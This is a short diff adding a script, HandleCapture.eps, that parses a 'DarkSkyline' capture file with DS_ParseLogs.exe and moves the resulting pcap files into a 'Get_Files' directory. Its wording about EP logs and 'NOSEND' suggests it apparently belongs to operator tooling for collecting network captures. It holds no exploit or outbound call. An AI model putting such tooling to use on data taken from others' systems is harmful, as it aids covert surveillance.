@@ -1,0 +1,59 @@
+#--------------------------------------------------------
+# File: HandleCapture.eps
+#
+# Handle DarkSyline capture file
+#
+# Modifications:
+#  01/13/2003	Created.
+#--------------------------------------------------------
+
+@echo off;
+
+if ($argc != 1) {
+    echo "Usage: $argv[0]";
+    return false;
+}
+
+@record on;
+
+# get resource directory
+ifnot (`getdirectory -resources`) {
+    echo "* Unable to get resources directory";
+    return false;
+}
+
+string $rDir = GetCmdData("dir");
+ifnot (defined($rDir[0])) {
+    echo "* Unable to retrieve resources directory";
+    return false;
+}
+
+string $resPath = "$rDir\\DarkSkyline";
+
+@record off;
+
+string $captureFile = GetInput("Enter a local capture file");
+string $prefix = GetInput("Enter a capture file prefix");
+
+@echo on;
+if (`local run -command "\\"$resPath\\DS_ParseLogs.exe\\" \\"$captureFile\\" \\"$prefix\\"" -redirect "ParseLogs_$prefix"`) {
+    echo "";
+    echo "Capture file parsed";
+    echo "";
+	string $underscore = "_";
+	string $prefixmask = "$prefix$underscore*.pcap";
+	@echo off;
+	string $logdir;
+	$localname = GetCmdData("localname");
+	@echo off;
+	_GetLpLogsDirectory($logdir);
+	`local run -command "cmd /c move $logdir\\$prefixmask $logdir\\Get_Files" -redirect`;
+	echo "Moved $prefixmask from EP log dir to Get_Files.";
+	echo "If your capture file was not from NOSEND, be sure to move it there.";
+    return true;
+} else {
+    echo "";
+    echo "*** FAILED to parse capture file";
+    echo "";
+    return false;
+}
